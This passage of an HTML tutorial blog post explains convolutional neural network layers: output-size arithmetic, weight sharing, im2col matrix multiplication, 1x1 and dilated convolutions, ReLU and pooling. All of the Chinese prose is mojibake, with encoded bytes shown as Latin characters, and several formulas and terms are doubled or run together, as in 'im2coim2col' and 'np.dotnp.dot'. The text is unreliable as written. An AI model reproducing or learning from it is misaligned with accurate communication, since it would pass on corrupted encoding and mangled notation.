<code>W2*H2*D2</code>å¯ä»¥é€šè¿‡è¾“å…¥æ•°æ®ä½“å°ºå¯¸<code>W1*H1*D1</code>ã€å·ç§¯å±‚ä¸­ç¥ç»å…ƒçš„æ„Ÿå—é‡å°ºå¯¸<code>F</code>ã€æ­¥é•¿<code>S</code>ã€æ»¤æ³¢å™¨æ•°é‡<code>K</code>å’Œé›¶å¡«å……çš„æ•°é‡<code>P</code>è®¡ç®—è¾“å‡ºå‡ºæ¥ï¼š</p><p><img src="http://ggb0n.cool/images/size.jpg" alt=""></p><p>æ³¨æ„è¿™äº›ç©ºé—´æ’åˆ—çš„è¶…å‚æ•°ä¹‹é—´æ˜¯ç›¸äº’é™åˆ¶çš„ã€‚ä¸¾ä¾‹è¯´æ¥ï¼Œå½“è¾“å…¥å°ºå¯¸<code>W=10</code>ï¼Œä¸ä½¿ç”¨é›¶å¡«å……<code>P=0</code>ï¼Œæ»¤æ³¢å™¨å°ºå¯¸ <code>F=3</code>ï¼Œæ­¤æ—¶æ­¥é•¿<code>S=2</code>æ˜¯è¡Œä¸é€šï¼Œå› ä¸º<code>(W-F+2P)/S+1=(10-3+0)/2+1=4.5</code>ï¼Œç»“æœä¸æ˜¯æ•´æ•°ï¼Œè¿™å°±æ˜¯è¯´ç¥ç»å…ƒä¸èƒ½æ•´é½å¯¹ç§°åœ°æ»‘è¿‡è¾“å…¥æ•°æ®ä½“ã€‚<br>å› æ­¤ï¼Œè¿™äº›è¶…å‚æ•°çš„è®¾å®šå°±è¢«è®¤ä¸ºæ˜¯æ— æ•ˆçš„ï¼Œä¸€ä¸ªå·ç§¯ç¥ç»ç½‘ç»œåº“å¯èƒ½ä¼šæŠ¥å‡ºä¸€ä¸ªé”™è¯¯ï¼Œé€šè¿‡ä¿®æ”¹é›¶å¡«å……å€¼ã€ä¿®æ”¹è¾“å…¥æ•°æ®ä½“å°ºå¯¸ï¼Œæˆ–è€…å…¶ä»–ä»€ä¹ˆæªæ–½æ¥è®©è®¾ç½®åˆç†ã€‚åˆç†åœ°è®¾ç½®ç½‘ç»œçš„å°ºå¯¸è®©æ‰€æœ‰çš„ç»´åº¦éƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯ç›¸å½“è®©äººå¤´ç—›çš„äº‹ï¼Œè€Œä½¿ç”¨é›¶å¡«å……å’Œéµå®ˆå…¶ä»–ä¸€äº›è®¾è®¡ç­–ç•¥å°†ä¼šæœ‰æ•ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p><strong>æƒå€¼å…±äº«</strong></p><p>åœ¨å·ç§¯å±‚ä¸­<code>æƒå€¼å…±äº«</code>æ˜¯ç”¨æ¥æ§åˆ¶å‚æ•°çš„æ•°é‡ã€‚å‡å¦‚åœ¨ä¸€ä¸ªå·ç§¯æ ¸ä¸­ï¼Œæ¯ä¸€ä¸ªæ„Ÿå—é‡é‡‡ç”¨çš„éƒ½æ˜¯ä¸åŒçš„æƒé‡å€¼ï¼ˆå·ç§¯æ ¸çš„å€¼ä¸åŒï¼‰ï¼Œé‚£ä¹ˆè¿™æ ·çš„ç½‘ç»œä¸­å‚æ•°æ•°é‡å°†æ˜¯ååˆ†å·¨å¤§çš„ã€‚</p><p>æƒå€¼å…±äº«æ˜¯åŸºäºè¿™æ ·çš„ä¸€ä¸ªåˆç†çš„å‡è®¾ï¼šå¦‚æœä¸€ä¸ªç‰¹å¾åœ¨è®¡ç®—æŸä¸ªç©ºé—´ä½ç½®<code>(x1,y1)(x1,y1)</code>çš„æ—¶å€™æœ‰ç”¨ï¼Œé‚£ä¹ˆå®ƒåœ¨è®¡ç®—å¦ä¸€ä¸ªä¸åŒä½ç½®<code>(x2,y2)(x2,y2)</code>çš„æ—¶å€™ä¹Ÿæœ‰ç”¨ã€‚åŸºäºè¿™ä¸ªå‡è®¾ï¼Œå¯ä»¥æ˜¾è‘—åœ°å‡å°‘å‚æ•°æ•°é‡ã€‚<br>æ¢è¨€ä¹‹ï¼Œå°±æ˜¯å°†æ·±åº¦ç»´åº¦ä¸Šä¸€ä¸ªå•ç‹¬çš„2ç»´åˆ‡ç‰‡çœ‹åš<code>æ·±åº¦åˆ‡ç‰‡</code>ï¼ˆ<code>depth slice</code>ï¼‰ï¼Œæ¯”å¦‚ä¸€ä¸ªæ•°æ®ä½“å°ºå¯¸ä¸º<code>[55x55x96]</code>çš„å°±æœ‰96ä¸ªæ·±åº¦åˆ‡ç‰‡ï¼Œæ¯ä¸ªå°ºå¯¸ä¸º<code>[55x55]</code>ï¼Œå…¶ä¸­åœ¨æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸Šçš„ç»“æœéƒ½ä½¿ç”¨åŒæ ·çš„æƒé‡å’Œåå·®è·å¾—çš„ã€‚<br>åœ¨è¿™æ ·çš„å‚æ•°å…±äº«ä¸‹ï¼Œå‡å¦‚ä¸€ä¸ªä¾‹å­ä¸­çš„ç¬¬ä¸€ä¸ªå·ç§¯å±‚æœ‰96ä¸ªå·ç§¯æ ¸ï¼Œé‚£ä¹ˆå°±æœ‰96ä¸ªä¸åŒçš„æƒé‡é›†äº†ï¼Œä¸€ä¸ªæƒé‡é›†å¯¹åº”ä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ï¼Œå¦‚æœå·ç§¯æ ¸çš„å¤§å°æ˜¯<code>11x11</code>çš„ï¼Œå›¾åƒæ˜¯RGB3é€šé“çš„ï¼Œé‚£ä¹ˆå°±å…±æœ‰<code>96x11x11x3=34,848</code>ä¸ªä¸åŒçš„æƒé‡ï¼Œæ€»å…±æœ‰<code>34,944</code>ä¸ªå‚æ•°ï¼ˆå› ä¸ºè¦+96ä¸ªåå·®ï¼‰ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸­çš„<code>55x55</code>çš„ç»“æœä½¿ç”¨çš„éƒ½æ˜¯åŒæ ·çš„å‚æ•°ã€‚</p><p>åœ¨åå‘ä¼ æ’­çš„æ—¶å€™ï¼Œéƒ½è¦è®¡ç®—æ¯ä¸ªç¥ç»å…ƒå¯¹å®ƒçš„æƒé‡çš„æ¢¯åº¦ï¼Œä½†æ˜¯éœ€è¦æŠŠåŒä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸Šçš„æ‰€æœ‰ç¥ç»å…ƒå¯¹æƒé‡çš„æ¢¯åº¦ç´¯åŠ ï¼Œè¿™æ ·å°±å¾—åˆ°äº†å¯¹å…±äº«æƒé‡çš„æ¢¯åº¦ã€‚è¿™æ ·ï¼Œæ¯ä¸ªåˆ‡ç‰‡åªæ›´æ–°ä¸€ä¸ªæƒé‡é›†ã€‚åŸç†å¦‚ä¸‹å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/CNN02.png" alt=""></p><p><img src="http://ggb0n.cool/images/CNN03.png" alt=""></p><p>å¦‚ä¸Šä¸¤å›¾æ‰€ç¤ºï¼Œå·¦ä¾§çš„ç¥ç»å…ƒæ˜¯å°†æ¯ä¸€ä¸ªæ„Ÿå—é‡å±•å¼€ä¸ºä¸€åˆ—ä¹‹åä¸²è”èµ·æ¥ï¼ˆå°±æ˜¯å±•å¼€æ’æˆä¸€åˆ—ï¼ŒåŒä¸€å±‚ç¥ç»å…ƒä¹‹é—´ä¸è¿æ¥ï¼‰ã€‚å³ä¾§çš„<code>Deep1i</code>æ˜¯æ·±åº¦ä¸º<code>1</code>çš„ç¥ç»å…ƒçš„ç¬¬<code>i</code>ä¸ªï¼Œ<code>Deep2i</code>æ˜¯æ·±åº¦ä¸º<code>2</code>çš„ç¥ç»å…ƒçš„ç¬¬<code>i</code>ä¸ªï¼ŒåŒä¸€ä¸ªæ·±åº¦çš„ç¥ç»å…ƒçš„æƒå€¼éƒ½æ˜¯ç›¸åŒçš„ï¼Œé»„è‰²çš„éƒ½æ˜¯ç›¸åŒçš„ï¼ˆä¸Šé¢4ä¸ªä¸ä¸‹é¢4ä¸ªçš„å‚æ•°ç›¸åŒï¼‰ï¼Œè“è‰²ä¹Ÿéƒ½æ˜¯ç›¸åŒçš„ã€‚</p><p>æ‰€ä»¥ç°åœ¨å›è¿‡å¤´æ¥çœ‹ä¸Šé¢è¯´çš„å·ç§¯ç¥ç»ç½‘ç»œçš„åå‘ä¼ æ’­å…¬å¼å¯¹æ¢¯åº¦è¿›è¡Œç´¯åŠ æ±‚å’Œä¹Ÿæ˜¯åŸºäºè¿™ç‚¹è€ƒè™‘ï¼ˆåŒä¸€æ·±åº¦çš„ä¸åŒç¥ç»å…ƒå…±ç”¨ä¸€ç»„å‚æ•°ï¼Œæ‰€ä»¥ç´¯åŠ ï¼‰ï¼›è€Œæ¯ä¸ªåˆ‡ç‰‡åªæ›´æ–°ä¸€ä¸ªæƒé‡é›†çš„åŸå› ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¸åŒæ·±åº¦çš„ç¥ç»å…ƒä¸ä¼šå…¬ç”¨ç›¸åŒçš„æƒé‡ï¼Œæ‰€ä»¥åªèƒ½æ›´æ–°ä¸€ä¸ªæƒé‡é›†ã€‚</p><blockquote><p>æ³¨æ„ï¼šå¦‚æœåœ¨ä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸­çš„æ‰€æœ‰æƒé‡éƒ½ä½¿ç”¨åŒä¸€ä¸ªæƒé‡å‘é‡ï¼Œé‚£ä¹ˆå·ç§¯å±‚çš„å‰å‘ä¼ æ’­åœ¨æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸­å¯ä»¥çœ‹åšæ˜¯åœ¨è®¡ç®—ç¥ç»å…ƒæƒé‡å’Œè¾“å…¥æ•°æ®ä½“çš„å·ç§¯ï¼ˆè¿™å°±æ˜¯â€œ<code>å·ç§¯å±‚</code>â€åå­—ç”±æ¥ï¼‰ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ€»æ˜¯å°†è¿™äº›æƒé‡é›†åˆç§°ä¸ºæ»¤æ³¢å™¨ï¼ˆæˆ–<code>å·ç§¯æ ¸</code>ï¼ˆ<code>kernel</code>ï¼‰ï¼‰ï¼Œå› ä¸ºå®ƒä»¬å’Œè¾“å…¥è¿›è¡Œäº†å·ç§¯ã€‚</p></blockquote><blockquote><p>æ³¨æ„ï¼šæœ‰æ—¶å€™å‚æ•°å…±äº«å‡è®¾å¯èƒ½æ²¡æœ‰æ„ä¹‰ï¼Œç‰¹åˆ«æ˜¯å½“å·ç§¯ç¥ç»ç½‘ç»œçš„è¾“å…¥å›¾åƒæ˜¯ä¸€äº›æ˜ç¡®çš„ä¸­å¿ƒç»“æ„æ—¶å€™ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±åº”è¯¥æœŸæœ›åœ¨å›¾ç‰‡çš„ä¸åŒä½ç½®å­¦ä¹ åˆ°å®Œå…¨ä¸åŒçš„ç‰¹å¾ï¼ˆè€Œä¸€ä¸ªå·ç§¯æ ¸æ»‘åŠ¨åœ°ä¸å›¾åƒåšå·ç§¯éƒ½æ˜¯åœ¨å­¦ä¹ ç›¸åŒçš„ç‰¹å¾ï¼‰ã€‚ä¸€ä¸ªå…·ä½“çš„ä¾‹å­å°±æ˜¯è¾“å…¥å›¾åƒæ˜¯äººè„¸ï¼Œäººè„¸ä¸€èˆ¬éƒ½å¤„äºå›¾ç‰‡ä¸­å¿ƒï¼Œè€Œæˆ‘ä»¬æœŸæœ›åœ¨ä¸åŒçš„ä½ç½®å­¦ä¹ åˆ°ä¸åŒçš„ç‰¹å¾ï¼Œæ¯”å¦‚çœ¼ç›ç‰¹å¾æˆ–è€…å¤´å‘ç‰¹å¾å¯èƒ½ï¼ˆä¹Ÿåº”è¯¥ï¼‰ä¼šåœ¨å›¾ç‰‡çš„ä¸åŒä½ç½®è¢«å­¦ä¹ ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé€šå¸¸å°±æ”¾æ¾å‚æ•°å…±äº«çš„é™åˆ¶ï¼Œå°†å±‚ç§°ä¸ºå±€éƒ¨è¿æ¥å±‚ï¼ˆ<code>Locally-Connected Layer</code>ï¼‰ã€‚</p></blockquote><p><strong>å·ç§¯å±‚çš„è¶…å‚æ•°åŠé€‰æ‹©</strong></p><p>ç”±äºå‚æ•°å…±äº«ï¼Œæ¯ä¸ªæ»¤æ³¢å™¨åŒ…å«<code>F*F*D1</code>ä¸ªæƒé‡ï¼Œå·ç§¯å±‚ä¸€å…±æœ‰<code>F*F*D1*K</code>ä¸ªæƒé‡å’Œ<code>K</code>ä¸ªåç§»ã€‚åœ¨è¾“å‡ºæ•°æ®ä½“ä¸­ï¼Œç¬¬<code>d</code>ä¸ªæ·±åº¦åˆ‡ç‰‡ï¼ˆç©ºé—´å°ºå¯¸æ˜¯<code>W2*H2</code>ï¼‰ï¼Œç”¨ç¬¬<code>d</code>ä¸ªæ»¤æ³¢å™¨å’Œè¾“å…¥æ•°æ®è¿›è¡Œæœ‰æ•ˆå·ç§¯è¿ç®—çš„ç»“æœï¼ˆä½¿ç”¨æ­¥é•¿<code>S</code>ï¼‰ï¼Œæœ€ååœ¨åŠ ä¸Šç¬¬<code>d</code>ä¸ªåå·®ã€‚</p><p>å¯¹è¿™äº›è¶…å‚æ•°ï¼Œå¸¸è§çš„è®¾ç½®æ˜¯<code>F=3</code>ï¼Œ<code>S=1</code>ï¼Œ<code>P=1</code>ï¼Œ<code>F=3</code>ï¼Œ<code>S=1</code>ï¼Œ<code>P=1</code>ã€‚</p><p><strong>å·ç§¯å±‚æ¼”ç¤º</strong></p><p>å› ä¸º3Dæ•°æ®éš¾ä»¥å¯è§†åŒ–ï¼Œæ‰€ä»¥æ‰€æœ‰çš„æ•°æ®ï¼ˆ<code>è¾“å…¥æ•°æ®ä½“æ˜¯è“è‰²</code>ï¼Œ<code>æƒé‡æ•°æ®ä½“æ˜¯çº¢è‰²</code>ï¼Œ<code>è¾“å‡ºæ•°æ®ä½“æ˜¯ç»¿è‰²</code>ï¼‰éƒ½é‡‡å–å°†æ·±åº¦åˆ‡ç‰‡æŒ‰ç…§åˆ—çš„æ–¹å¼æ’åˆ—å±•ç°ã€‚è¾“å…¥æ•°æ®ä½“çš„å°ºå¯¸æ˜¯<code>W1=5</code>ï¼Œ<code>H1=5</code>ï¼Œ<code>D1=3</code>ï¼Œ<code>W1=5</code>ï¼Œ<code>H1=5</code>ï¼Œ<code>D1=3</code>ï¼Œå·ç§¯å±‚å‚æ•°<code>K=2</code>ï¼Œ<code>F=3</code>ï¼Œ<code>S=2</code>ï¼Œ<code>P=1</code>ï¼Œ<code>K=2</code>ï¼Œ<code>F=3</code>ï¼Œ<code>S=2</code>ï¼Œ<code>P=1</code>ã€‚å°±æ˜¯è¯´ï¼Œæœ‰<code>2</code>ä¸ªæ»¤æ³¢å™¨ï¼Œæ»¤æ³¢å™¨çš„å°ºå¯¸æ˜¯<code>3*33*3</code>ï¼Œå®ƒä»¬çš„æ­¥é•¿æ˜¯<code>2</code>ã€‚å› æ­¤ï¼Œè¾“å‡ºæ•°æ®ä½“çš„ç©ºé—´å°ºå¯¸æ˜¯<code>(5âˆ’3+2)/2+1=3(5âˆ’3+2)/2+1=3</code>ã€‚æ³¨æ„è¾“å…¥æ•°æ®ä½“ä½¿ç”¨äº†é›¶å¡«å……<code>P=1</code>ï¼Œæ‰€ä»¥è¾“å…¥æ•°æ®ä½“å¤–è¾¹ç¼˜ä¸€åœˆéƒ½æ˜¯<code>0</code>ã€‚<br>ä¸‹é¢çš„ä¾‹å­åœ¨ç»¿è‰²çš„è¾“å‡ºæ¿€æ´»æ•°æ®ä¸Šå¾ªç¯æ¼”ç¤ºï¼Œå±•ç¤ºäº†å…¶ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å…ˆé€šè¿‡è“è‰²çš„è¾“å…¥æ•°æ®å’Œçº¢è‰²çš„æ»¤æ³¢å™¨é€å…ƒç´ ç›¸ä¹˜ï¼Œç„¶åæ±‚å…¶æ€»å’Œï¼Œæœ€ååŠ ä¸Šåå·®å¾—æ¥ã€‚<br><img src="http://ggb0n.cool/images/juanji.jpg" alt=""></p><p><strong>å·ç§¯æ“ä½œå½¢å¼</strong></p><p>å·ç§¯æ“ä½œçš„å½¢å¼æ¯”è¾ƒå¤šï¼Œè¿™é‡Œä¸»è¦ä»‹ç»ä¸‰ç‚¹ï¼š<code>çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯</code>ã€<code>1*1å·ç§¯</code>ã€<code>æ‰©å¼ å·ç§¯</code>ã€‚</p><ul><li>ç”¨çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯</li></ul><blockquote><p>å·ç§¯è¿ç®—æœ¬è´¨ä¸Šå°±æ˜¯åœ¨æ»¤æ³¢å™¨å’Œè¾“å…¥æ•°æ®çš„å±€éƒ¨åŒºåŸŸé—´åšç‚¹ç§¯ã€‚å·ç§¯å±‚çš„å¸¸ç”¨å®ç°æ–¹å¼å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå°†å·ç§¯å±‚çš„å‰å‘ä¼ æ’­å˜æˆä¸€ä¸ªå·¨å¤§çš„çŸ©é˜µä¹˜æ³•ã€‚</p><p>(1) è¾“å…¥å›¾åƒçš„å±€éƒ¨åŒºåŸŸè¢«<code>im2coim2col</code>æ“ä½œæ‹‰ä¼¸ä¸ºåˆ—ã€‚æ¯”å¦‚è¾“å…¥æ˜¯<code>[227x227x3]</code>ï¼Œè¦ä¸å°ºå¯¸ä¸º<code>11x11x3</code>çš„æ»¤æ³¢å™¨ä»¥æ­¥é•¿ä¸º<code>4</code>è¿›è¡Œå·ç§¯ï¼Œå°±ä¾æ¬¡å–è¾“å…¥ä¸­çš„<code>[11x11x3]</code>æ•°æ®å—ï¼Œç„¶åå°†å…¶æ‹‰ä¼¸ä¸ºé•¿åº¦ä¸º<code>11x11x3=363</code>çš„åˆ—å‘é‡ã€‚é‡å¤è¿›è¡Œè¿™ä¸€è¿‡ç¨‹ï¼Œå› ä¸ºæ­¥é•¿ä¸º<code>4</code> ï¼Œæ‰€ä»¥ç»è¿‡å·ç§¯åçš„å®½å’Œé«˜å‡ä¸º<code>(227-11)/4+1=55</code>ï¼Œå…±æœ‰<code>55x55=3,025</code>ä¸ªç¥ç»å…ƒã€‚å› ä¸ºæ¯ä¸€ä¸ªç¥ç»å…ƒå®é™…ä¸Šéƒ½æ˜¯å¯¹åº”æœ‰<code>363</code>çš„åˆ—å‘é‡æ„æˆçš„æ„Ÿå—é‡ï¼Œå³ä¸€å…±è¦ä»è¾“å…¥ä¸Šå–å‡º<code>3025</code>ä¸ª<code>363</code>ç»´çš„åˆ—å‘é‡ã€‚æ‰€ä»¥ç»è¿‡<code>im2col</code>æ“ä½œå¾—åˆ°çš„è¾“å‡ºçŸ©é˜µçš„å°ºå¯¸æ˜¯<code>[363x3025]</code>ï¼Œå…¶ä¸­æ¯åˆ—æ˜¯æ‹‰ä¼¸çš„æ„Ÿå—é‡ã€‚æ³¨æ„å› ä¸ºæ„Ÿå—é‡ä¹‹é—´æœ‰é‡å ï¼Œæ‰€ä»¥è¾“å…¥æ•°æ®ä½“ä¸­çš„æ•°å­—åœ¨ä¸åŒçš„åˆ—ä¸­å¯èƒ½æœ‰é‡å¤ã€‚</p><p>(2) å·ç§¯å±‚çš„æƒé‡ä¹ŸåŒæ ·è¢«æ‹‰ä¼¸æˆè¡Œã€‚ä¸¾ä¾‹ï¼šå¦‚æœæœ‰96ä¸ªå°ºå¯¸ä¸º<code>[11x11x3]</code>çš„æ»¤æ³¢å™¨ï¼Œå°±ç”Ÿæˆä¸€ä¸ªçŸ©é˜µï¼Œå°ºå¯¸ä¸º<code>[96x363]</code>ã€‚</p><p>(3) ç°åœ¨å·ç§¯çš„ç»“æœå’Œè¿›è¡Œä¸€ä¸ªå¤§çŸ©é˜µä¹˜æ³•<code>np.dot(Wrow,Xcol)np.dot(Wrow,Xcol)</code>æ˜¯ç­‰ä»·çš„äº†ï¼Œèƒ½å¾—åˆ°æ¯ä¸ªæ»¤æ³¢å™¨å’Œæ¯ä¸ªæ„Ÿå—é‡é—´çš„ç‚¹ç§¯ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œè¿™ä¸ªæ“ä½œçš„è¾“å‡ºæ˜¯<code>[96x3025]</code>ï¼Œç»™å‡ºäº†æ¯ä¸ªæ»¤æ³¢å™¨åœ¨æ¯ä¸ªä½ç½®çš„ç‚¹ç§¯è¾“å‡ºã€‚æ³¨æ„å…¶ä¸­çš„<code>np.dotnp.dot</code>è®¡ç®—çš„æ˜¯çŸ©é˜µä¹˜æ³•è€Œä¸æ˜¯ç‚¹ç§¯ã€‚</p><p>(4) ç»“æœæœ€åå¿…é¡»è¢«é‡æ–°å˜ä¸ºåˆç†çš„è¾“å‡ºå°ºå¯¸<code>[55x55x96]</code>ã€‚</p></blockquote><p>è¿™ä¸ªæ–¹æ³•çš„ç¼ºç‚¹å°±æ˜¯å ç”¨å†…å­˜å¤ªå¤šï¼Œå› ä¸ºåœ¨è¾“å…¥æ•°æ®ä½“ä¸­çš„æŸäº›å€¼åœ¨<code>XcolXcol</code>ä¸­è¢«å¤åˆ¶äº†å¤šæ¬¡ï¼›ä¼˜ç‚¹åœ¨äºçŸ©é˜µä¹˜æ³•æœ‰éå¸¸å¤šçš„é«˜æ•ˆåº•å±‚å®ç°æ–¹å¼ã€‚</p><ul><li>1*1å·ç§¯</li></ul><p>å…·æœ‰ä¿¡å·å¤„ç†ä¸“ä¸šçŸ¥è¯†çš„äººåˆšå¼€å§‹çœ‹è§è¿™ä¸ª<code>1*1å·ç§¯</code>çš„æ—¶å€™å¯èƒ½ä¼šæ¯”è¾ƒå›°æƒ‘ï¼Œå› ä¸ºä¿¡å·æ˜¯<code>2</code>ç»´çš„ï¼Œæ‰€ä»¥<code>1*1å·ç§¯</code>å°±æ²¡æœ‰æ„ä¹‰ã€‚ä½†æ˜¯ï¼Œåœ¨å·ç§¯ç¥ç»ç½‘ç»œä¸­ä¸æ˜¯è¿™æ ·ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å¯¹<code>3</code>ä¸ªç»´åº¦è¿›è¡Œæ“ä½œï¼Œæ»¤æ³¢å™¨å’Œè¾“å…¥æ•°æ®ä½“çš„æ·±åº¦æ˜¯ä¸€æ ·çš„ã€‚æ¯”å¦‚ï¼Œå¦‚æœè¾“å…¥æ˜¯<code>[32x32x3]</code>ï¼Œé‚£ä¹ˆ<code>1*1å·ç§¯</code>å°±æ˜¯åœ¨é«˜æ•ˆåœ°è¿›è¡Œ<code>3</code>ç»´<code>ç‚¹ç§¯</code>ï¼ˆå› ä¸ºè¾“å…¥æ·±åº¦æ˜¯3ä¸ªé€šé“ï¼‰ï¼›å¦å¤–çš„ä¸€ç§æƒ³æ³•æ˜¯å°†è¿™ç§å·ç§¯çš„ç»“æœçœ‹ä½œæ˜¯å…¨è¿æ¥å±‚çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œåé¢è®²åˆ°å…¨è¿æ¥å±‚ä¼šæåˆ°ã€‚</p><ul><li>æ‰©å¼ å·ç§¯</li></ul><p>æˆ‘ä»¬å‰é¢æåˆ°çš„æ»¤æ³¢å™¨éƒ½æ˜¯è¿ç»­çš„ï¼Œä½†æ˜¯ï¼Œè®©æ»¤æ³¢å™¨ä¸­å…ƒç´ ä¹‹é—´æœ‰é—´éš™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™å°±å«åšæ‰©å¼ ï¼Œå¦‚å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/kuozhang.jpg" alt=""></p><p>åœ¨æŸäº›è®¾ç½®ä¸­ï¼Œæ‰©å¼ å·ç§¯ä¸æ­£å¸¸å·ç§¯ç»“åˆèµ·æ¥éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºè¿™å¯ä»¥åœ¨å¾ˆå°‘çš„å±‚æ•°å†…æ›´å¿«åœ°æ±‡é›†è¾“å…¥å›¾ç‰‡çš„å¤§å°ºåº¦ç‰¹å¾ã€‚æ¯”å¦‚ï¼Œå¦‚æœä¸Šä¸‹é‡å <code>2</code>ä¸ª<code>3*3</code>çš„å·ç§¯å±‚ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå·ç§¯å±‚çš„ç¥ç»å…ƒçš„æ„Ÿå—é‡æ˜¯è¾“å…¥æ•°æ®ä½“ä¸­<code>5*5</code>çš„åŒºåŸŸï¼ˆå¯ä»¥ç§°è¿™äº›ç¥ç»å…ƒçš„æœ‰æ•ˆæ„Ÿå—é‡æ˜¯5*5ï¼‰ã€‚å¦‚æœæˆ‘ä»¬å¯¹å·ç§¯è¿›è¡Œæ‰©å¼ ï¼Œé‚£ä¹ˆè¿™ä¸ªæœ‰æ•ˆæ„Ÿå—é‡å°±ä¼šè¿…é€Ÿå¢é•¿ã€‚</p><p>è‡³æ­¤ï¼Œå¯¹å·ç§¯å±‚çš„å­¦ä¹ å‘Šä¸€æ®µè½ï¼Œä¸‹ä¸€å±‚æ˜¯æ± åŒ–å±‚ã€‚</p><h4 id="ReLUå±‚"><a href="#ReLUå±‚" class="headerlink" title="ReLUå±‚"></a>ReLUå±‚</h4><p>ä¹Ÿç§°çº¿æ€§æ•´æµå±‚ï¼ˆ<code>Rectified Linear Units layer, ReLU layer</code>ï¼‰ï¼Œä½¿ç”¨<a href="https://zh.wikipedia.org/wiki/çº¿æ€§æ•´æµå‡½æ•°">çº¿æ€§æ•´æµå‡½æ•°</a>ï¼ˆ<code>Rectified Linear Units, ReLU</code>ï¼‰<code>f(x)=max(0,x)</code>ä½œä¸ºè¿™ä¸€å±‚ç¥ç»çš„æ¿€åŠ±å‡½æ•°ï¼ˆ<code>Activation function</code>ï¼‰ã€‚å®ƒå¯ä»¥å¢å¼ºåˆ¤å®šå‡½æ•°å’Œæ•´ä¸ªç¥ç»ç½‘ç»œçš„éçº¿æ€§ç‰¹æ€§ï¼Œè€Œæœ¬èº«å¹¶ä¸ä¼šæ”¹å˜å·ç§¯å±‚ã€‚</p><p>äº‹å®ä¸Šï¼Œå…¶ä»–çš„ä¸€äº›å‡½æ•°ä¹Ÿå¯ä»¥ç”¨äºå¢å¼ºç½‘ç»œçš„éçº¿æ€§ç‰¹æ€§ï¼Œå¦‚<a href="https://zh.wikipedia.org/wiki/åŒæ›²æ­£åˆ‡å‡½æ•°">åŒæ›²æ­£åˆ‡å‡½æ•°</a> <code>f(x)=tanh(x)</code>ã€<code>f(x)=|tanh(x)|</code>ï¼Œæˆ–è€…<a href="https://zh.wikipedia.org/wiki/Så‡½æ•°">Sigmoidå‡½æ•°</a><code>f(x)=(1+e^(-x))^(-1)</code>ã€‚ç›¸æ¯”å…¶å®ƒå‡½æ•°æ¥è¯´ï¼ŒReLUå‡½æ•°æ›´å—é’çï¼Œè¿™æ˜¯å› ä¸ºå®ƒå¯ä»¥å°†ç¥ç»ç½‘ç»œçš„è®­ç»ƒé€Ÿåº¦æå‡æ•°å€ï¼Œè€Œå¹¶ä¸ä¼šå¯¹æ¨¡å‹çš„æ³›åŒ–å‡†ç¡®åº¦é€ æˆæ˜¾è‘—å½±å“ã€‚</p><h4 id="æ± åŒ–å±‚"><a href="#æ± åŒ–å±‚" class="headerlink" title="æ± åŒ–å±‚"></a>æ± åŒ–å±‚</h4><p>é€šå¸¸åœ¨è¿ç»­çš„å·ç§¯å±‚ä¹‹é—´ä¼šå‘¨æœŸæ€§åœ°æ’å…¥ä¸€ä¸ª<code>æ± åŒ–å±‚</code>ï¼ˆ<code>Pooling</code>ï¼‰ï¼Œå®ƒçš„ä½œç”¨æ˜¯é€æ¸é™ä½æ•°æ®ä½“çš„ç©ºé—´å°ºå¯¸ï¼Œè¿™æ ·çš„è¯å°±èƒ½å‡å°‘ç½‘ç»œä¸­å‚æ•°çš„æ•°é‡ï¼Œä½¿å¾—è®¡ç®—èµ„æºè€—è´¹å˜å°‘ï¼Œä¹Ÿèƒ½æœ‰æ•ˆæ§åˆ¶è¿‡æ‹Ÿåˆã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/pooling.png" alt=""></p><p>æ± åŒ–å±‚ä½¿ç”¨<code>MAX</code>æ“ä½œï¼Œå¯¹è¾“å…¥æ•°æ®ä½“çš„æ¯ä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ç‹¬ç«‹è¿›è¡Œæ“ä½œï¼Œæ”¹å˜å®ƒçš„ç©ºé—´å°ºå¯¸ã€‚æœ€å¸¸è§çš„å½¢å¼æ˜¯ä½¿ç”¨å°ºå¯¸<code>2*2</code>çš„æ»¤æ³¢å™¨ï¼Œä»¥æ­¥é•¿ä¸º<code>2</code>æ¥å¯¹æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡è¿›è¡Œé™é‡‡æ ·ï¼Œå°†å…¶ä¸­<code>75%</code>çš„æ¿€æ´»ä¿¡æ¯éƒ½ä¸¢æ‰ã€‚æ¯ä¸ª<code>MAX</code>æ“ä½œæ˜¯ä»<code>4</code>ä¸ªæ•°å­—ä¸­å–æœ€å¤§å€¼ï¼ˆä¹Ÿå°±æ˜¯åœ¨æ·±åº¦åˆ‡ç‰‡ä¸­æŸä¸ª<code>2*2</code>çš„åŒºåŸŸï¼‰ï¼Œæ·±åº¦ä¿æŒä¸å˜ã€‚</p><p>æ± 